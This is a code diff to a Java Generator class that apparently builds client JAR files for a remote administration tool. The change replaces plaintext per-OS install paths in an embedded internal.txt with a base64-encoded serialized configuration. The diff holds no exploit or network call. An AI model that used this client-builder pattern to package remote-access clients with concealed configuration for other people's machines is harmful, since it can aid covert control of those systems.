@@ -30,6 +30,7 @@ import com.subterranean_security.crimson.core.Common;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.proto.Generator.GenReport;
 import com.subterranean_security.crimson.core.storage.ClientDB;
+import com.subterranean_security.crimson.core.util.B64;
 import com.subterranean_security.crimson.core.util.CUtil;
 
 public class Generator {
@@ -46,7 +47,8 @@ public class Generator {
 	public Generator(ClientConfig config) throws Exception {
 
 		// store the group
-	//	ServerStore.Authentication.create(config.getGroup(), "admin");// TODO!!!!!!!!!
+		// ServerStore.Authentication.create(config.getGroup(), "admin");//
+		// TODO!!!!!!!!!
 
 		String output = config.getOutputType().toLowerCase();
 		if (output.endsWith("(.jar)")) {
@@ -122,11 +124,7 @@ public class Generator {
 		// create and add the internal.txt
 		internal.createNewFile();
 		PrintWriter pw = new PrintWriter(internal);
-		pw.println("base_win<>" + ic.getPathWin());
-		pw.println("base_lin<>" + ic.getPathLin());
-		pw.println("base_osx<>" + ic.getPathOsx());
-		pw.println("base_sol<>" + ic.getPathSol());
-		pw.println("base_bsd<>" + ic.getPathBsd());
+		pw.println(B64.encode(ic.toByteArray()));
 		pw.close();
 
 		ZipUtil.addEntry(clientJar, "com/subterranean_security/crimson/client/internal.txt", internal);
